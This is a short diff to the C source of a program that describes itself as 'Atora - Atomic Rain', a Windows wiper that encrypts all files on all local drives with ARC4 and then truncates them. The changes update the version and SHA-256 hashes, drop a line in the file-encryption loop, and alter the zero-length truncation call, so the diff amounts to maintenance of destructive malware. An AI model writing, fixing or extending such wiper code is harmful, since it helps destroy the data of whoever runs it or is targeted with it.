@@ -1,11 +1,11 @@
 /*
   Name:             Atora - Atomic Rain. Windows version.
-  Version:          5.57/01.06.20
+  Version:          5.58/04.06.20
   Compiler:         TCC ver 0.9.27
   Class:            Files shredder for Windows. Wiper.
   What is he doing: Encrypts all files on all local drives with a cipher ARC4
-  SHA-2-256:        17806e6725140db854bf80de7856f7f57097e43ef92d8fc7585c716096ba1f41
-  SHA-2-256_UPX:    e31f0a9a18b198ac87ba792d49c299cfc59d5f316c6bb47f1f0abb372d1973bf
+  SHA-2-256:        bdca9380e25090a82dd1c47a560388a54ea69f5da33bfef7369dc5df47674c5b
+  SHA-2-256_UPX:    6c281e02ba297b4474061d6ae4c6419ab5161dec4397287e26533b16f7999420
 */
 #include <io.h>
 #include <time.h>
@@ -111,7 +111,6 @@ void file_encrypt(MEMORY_CTX * ctx, const uint8_t * filename) {
     fseek(file, position, SEEK_SET);
 
     if (fwrite((void *)(ctx->output), 1, realread, file) != realread) {
-      position = fsize;
       break;
     }
 
@@ -122,7 +121,7 @@ void file_encrypt(MEMORY_CTX * ctx, const uint8_t * filename) {
   memset((void *)(ctx->input),  0x00, BUFFER_SIZE);
   memset((void *)(ctx->output), 0x00, BUFFER_SIZE);
 
-  (void)chsize(fileno(file), 0L);
+  (void)chsize(fileno(file), 0);
 
   fclose(file);
 }
